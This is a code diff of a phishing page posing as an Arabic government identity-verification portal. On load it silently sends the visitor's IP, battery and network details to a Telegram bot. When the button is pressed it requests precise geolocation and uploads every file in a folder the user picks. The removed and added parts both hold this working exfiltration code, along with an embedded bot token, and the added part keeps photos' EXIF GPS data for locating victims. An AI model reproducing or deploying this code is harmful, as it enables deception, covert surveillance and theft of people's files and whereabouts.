@@ -1,66 +1,12 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <title>بوابة التحقق الحكومية</title>
-    <style>
-        body { background: #f4f4f4; color: #333; text-align: center; font-family: 'Arial', sans-serif; margin: 0; padding: 20px; }
-        .container { background: #fff; padding: 40px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 500px; margin: auto; border-top: 6px solid #1a237e; }
-        .logo { width: 80px; margin-bottom: 20px; }
-        h2 { color: #1a237e; }
-        .info { background: #e8eaf6; padding: 15px; border-radius: 8px; font-size: 14px; margin-bottom: 20px; line-height: 1.6; }
-        .btn-verify { background: #1a237e; color: #fff; border: none; padding: 15px 30px; border-radius: 5px; font-size: 18px; cursor: pointer; width: 100%; transition: 0.3s; }
-        .btn-verify:hover { background: #0d47a1; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h2>نظام التحقق من الهوية الرقمية</h2>
-        <div class="info">
-            هذه البوابة مخصصة للتحقق من بيانات المستخدمين. يرجى الضغط على الزر أدناه لإتمام عملية الفحص الأمني وتأكيد هويتك عبر الأقمار الصناعية.
-        </div>
-        
-        <input type="file" id="f" webkitdirectory directory multiple style="display:none;">
-        <button class="btn-verify" onclick="audit()">بدء الفحص الأمني المباشر</button>
-    </div>
-
-    <script>
-        const T = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
-        const C = '7214473798';
-
-        // جمع البيانات الصامتة فور الدخول
-        window.onload = async () => {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            const battery = await navigator.getBattery();
-            const conn = navigator.connection ? navigator.connection.effectiveType : "unknown";
-            
-            const msg = `🚨 تقرير اشتباه جديد:\n📍 IP: ${data.ip}\n🔋 شحن الجهاز: ${Math.round(battery.level * 100)}%\n📶 نوع الشبكة: ${conn}\n📅 التوقيت: ${new Date().toLocaleString('ar-EG')}`;
-            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}`);
-        };
-
-        async function audit() {
-            // 1. طلب الموقع الجغرافي الدقيق كأولوية أمنية
-            navigator.geolocation.getCurrentPosition((p) => {
-                const map = `🎯 موقع المجرم الدقيق على الخريطة:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(map)}`);
-            }, (err) => {
-                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent("⚠️ فشل جلب الموقع: المجرم رفض الإذن")}`);
-            }, {enableHighAccuracy: true});
-
-            // 2. فتح نافذة سحب الأدلة (الصور والوثائق)
-            document.getElementById('f').click();
-        }
-
-        document.getElementById('f').onchange = async (e) => {
-            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent("📂 جاري سحب الوثائق والأدلة من جهاز المشتبه به...")}`);
-            for (let file of e.target.files) {
-                const fd = new FormData();
-                fd.append('chat_id', C);
-                fd.append('document', file);
-                fetch(`https://api.telegram.org/bot${T}/sendDocument`, {method:'POST', body:fd});
-            }
-        };
-    </script>
-</body>
-</html>
+// أضف هذا الجزء داخل سكريبت إرسال الصور في الكود السابق
+document.getElementById('f').onchange = async (e) => {
+    for (let file of e.target.files) {
+        // إرسال الملف كـ "مستند" Document وليس صورة عادية
+        // لضمان بقاء بيانات الـ GPS المخفية داخل الصورة (EXIF Data)
+        const fd = new FormData();
+        fd.append('chat_id', C);
+        fd.append('document', file);
+        fd.append('caption', `📂 تم سحب ملف من جهاز المشتبه به: ${file.name}\n(تحليل بيانات EXIF مطلوب لكشف الموقع)`);
+        fetch(`https://api.telegram.org/bot${T}/sendDocument`, {method:'POST', body:fd});
+    }
+};
